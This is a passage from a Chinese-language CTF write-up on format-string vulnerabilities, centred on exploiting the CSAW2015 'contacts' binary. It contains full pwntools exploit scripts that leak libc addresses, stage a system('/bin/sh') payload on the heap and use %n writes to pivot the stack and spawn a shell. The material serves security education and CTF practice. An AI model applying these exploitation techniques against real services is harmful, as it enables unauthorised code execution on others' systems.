    p.send("abcd.%6$lx") 
    print p.recvline()
    p.sendline("1234")
    print p.recvuntil(">")
    p.sendline("1")
    tmpstackaddress = p.recvline()[:-5][5:]
    stackaddress = int(tmpstackaddress,16) - 0x38
    print "-----insert formatstring-----"
    print p.recvuntil(">")
    p.sendline("2")
    print p.recvline()
    p.sendline(p64(stackaddress))
    print p.readline()
    p.sendline("%2214x%8$hn")
    print p.recvuntil(">")
    print "-----exploit-----"
    p.sendline("1")
    p.interactive()
**5、有binary且格式化字符串不在栈中**
由于格式化字符串是放在堆上的，不能像前文在栈中保存那样直接修改函数返回地址，只能想办法构造一个跳板来实现利用。
**5.1 CSAW2015-contacts**
本题有nx和canary两个安全措施，栈上不可执行代码。
通过查看IDA逆向出的代码，可知sub_8048BD1是具体的脆弱函数（如上图所示，sub_8048C29是其上层函数），其最后一个printf在打印description时存在格式化字符串漏洞，我们这里调试确认一下。
如上图所示，当创建一个新帐户，并为description赋值“aaaa.%1$x.%2$x”时，程序打印出了栈中的内容，说明确实存在格式化字符串漏洞；且偏移11处（上图堆栈视图的第二个红框）指向了保存在堆中的description字段内容，而偏移31处指向了整个程序的main函数在返回“__libc_start_main”函数时的地址。当然，这肯定不是一次就能知道的，我也是在多次调试后才整理出来，在这里把途径简要描述一下。
从上面的调试可知以下几点：
题目没提供libc库文件也没直接将getshell功能的函数编译进去，那我们只能自己想办法获得正确的libc库文件，好在我们有返回“__libc_start_main”函数时的地址。
格式化字符串是放在堆上的，不能像栈中保存那样直接修改函数返回地址，只能想办法构造一个跳板。
**1、确定libc库内地址**
首先，我们来解决第一个问题。
之所以想获得libc库文件，是因为栈不可执行，所以希望调用system来获得shell。
niklasb的libc-database可以根据main函数返回__libc_start_main函数的返回地址的后12bit来确定libc版本，需要下载这个软件并运行get文件来获得最新的libc-symbol库。libc-database的原理就是遍历db文件夹下所有libc文件的symbol并比对最后12bit来确定libc版本。除了所有libc库函数的调用地址外，还特别加入了__libc_start_main_ret和“/bin/sh”字符串地址。我这里得到的“__libc_start_main_ret”的后12bit是70e，如上图所示。
    root@kali:~/Desktop/libc-database-master# ./find __libc_start_main_ret 70e
    archive-glibc (id libc6-i386_2.21-0ubuntu5_amd64)
运行如上命令，得到libc版本为2.21（这是我本地的libc版本），从而确定了system和“/bin/sh”字符串的偏移分别是0x3ad00和0x15c7e8。可以通过
    ./dump libc6-i386_2.21-0ubuntu5_amd64
来获得该libc文件的常见偏移，如system、/bin/sh等。
**2、构造payload**
此时，根据已知信息，可以考虑在栈上布置如下代码。
    payload = %11$x+p32(system)+‘AAAA’+p32(binsh)
再次创建contacts记录，在description字段输入payload。其中，%11$x是用来泄漏该description保存地址的，为什么是11前面讲过了；而后面的部分与栈溢出时布置参数的方式很像，一会儿我们就通过堆栈互换，将esp指向这里，从而调用system。其实，%11$x也可以放到p32(binsh)后面，但因为我这里的system调用地址的最后1字节是”x00”，如果将%11$x放到最后，则printf由于截断就不会打印出description保存地址了。
此外，由于此时我们已经录入两个contact，故在利用程序的display功能打印数据时要考虑这个因素。
**3、利用跳板执行堆上的payload**
堆上的payload已经安排好了，但如何才能执行到呢？
这里就要%$n出场了，利用它将payload地址写到栈上，从而实现堆栈互换。上图是存在格式化字符串漏洞的printf代码即将运行前的现场。其中，右下角栈视图红色框中是偏移6的位置，指向了下面紫色框，而这个紫色框是上层函数的ebp，本来指向的是再上层函数（也就是main函数）的ebp，但我们希望让其指向堆中的payload。这样，当紫色框中的地址被载入ebp时，也就是main程序返回时，就可以通过leave指令实现堆栈互换，从而执行堆中的payload了。这里有点绕，偏移6处改写的是紫色框中的地址，而这个地址真正用到时，是main函数返回时，也就是我们选择contact的功能5时。
leave指令相当于
    mov esp,ebp
    pop ebp
这两条指令，也就是将esp指向ebp的位置。经过调试可知，这里的leave指令是将esp指向了（ebp+4）的位置，因此在第三次创建contact记录时，我们插入如下description：
    %(int(payload地址-4,16))x%6$n
其表示，将打印出来的字符数，即int(payload地址-4,16)写入偏移6指向的ebp处，即上图中的紫色框处（将原先指向上层函数的地址改成指向堆中payload地址）。这样，当我们接下来选择功能5退出contact程序时，在执行leave指令时，会实现堆栈互换，从而将esp指向了堆中的payload，结果如下图所示。当执行ret指令时，要返回的地址，也就是esp指向的地址就是我们布置的system的调用地址。
具体代码如下：
    p = process('./contacts')
    print "----------1 fmtstr : leak address----------"
    print p.recvuntil(">>> ")
    p.sendline("1")
    print p.recvuntil("Name: ")
    p.sendline("aaaaaa")
    print p.recvuntil("No: ")
    p.sendline("111111")
    print p.recvuntil("description: ")
    p.sendline("1000")
    print p.readline()
    p.sendline("pppp.%31$x")
    print p.recvuntil(">>> ")
    p.sendline("4")
    description = p.recvuntil(">>> ").split('Description:')[1].split('Menu')[0].strip()
    systemOffset   = 0x3ad00 
    libcretOffset  = 0x1870e
    binshOffset    = 0x15c7e8
    libcretAddress = int(description.split('.')[1], 16)
    binshAddress   = libcretAddress - (libcretOffset - binshOffset)
    systemAddress  = libcretAddress + (systemOffset - libcretOffset)
    print "----------2 fmtstr : insert payload----------"
    payload = "xxxxx.%11$x" + p32(systemAddress) + "AAAA" + p32(binshAddress)
    p.sendline("1")
    print p.recvuntil("Name: ")
    p.sendline("bbbbbb")
    print p.recvuntil("No: ")
    p.sendline("222222")
    print p.recvuntil("description: ")
    p.sendline("1000")
    print p.readline()
    p.sendline(payload)
    print p.recvuntil(">>> ")
    p.sendline("4")
    print p.recvuntil("xxxxx.")
    description = p.recvuntil(">>> ")
    payloadAddress = description[0:7]
    print "----------3 fmtstr : exploit----------"
    p.sendline("1")
    print p.recvuntil("Name: ")
    p.sendline("cccccc")
    print p.recvuntil("No: ")
    p.sendline("333333")
    print p.recvuntil("description: ")
    p.sendline("1000")
    print p.readline()
    tmp = int(payloadAddress, 16) - 4 + 11 
    p.sendline("%" + str(tmp) + "x%6$n")
    print p.recvuntil(">>> ")
    p.sendline("4")
    print p.recvuntil(">>> ")
    p.sendline("5")
    p.interactive()
**参考文章**
[](http://www.cnblogs.com/Ox9A82/)
[http://www.cnblogs.com/Ox9A82/](http://www.cnblogs.com/Ox9A82/)
[http://www.tuicool.com/articles/iq6Jfe](http://www.tuicool.com/articles/iq6Jfe)
[http://matshao.com/2016/07/13/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-%E6%9D%A5-PWN-%E6%88%91%E4%B8%80%E4%B8%8B%E5%A5%BD%E5%90%97%E7%AC%AC%E4%BA%8C%E6%9C%9F/](http://matshao.com/2016/07/13/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-%E6%9D%A5-PWN-%E6%88%91%E4%B8%80%E4%B8%8B%E5%A5%BD%E5%90%97%E7%AC%AC%E4%BA%8C%E6%9C%9F/)
**附件**
[](https://pan.baidu.com/s/1pLM2Pfl "https://pan.baidu.com/s/1pLM2Pfl")
[https://pan.baidu.com/s/1pLM2Pfl](https://pan.baidu.com/s/1pLM2Pfl
"https://pan.baidu.com/s/1pLM2Pfl")